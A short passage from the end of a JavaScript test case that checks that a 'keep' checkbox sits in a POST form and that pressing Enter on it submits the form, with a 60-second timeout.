    expect(keep.element).toMatchObject({ type: "checkbox", form: { method: "post" } });
    expect(consequenceOf(keep.element, "press", "Enter")).toBe("submit");
  },
  60_000,
);
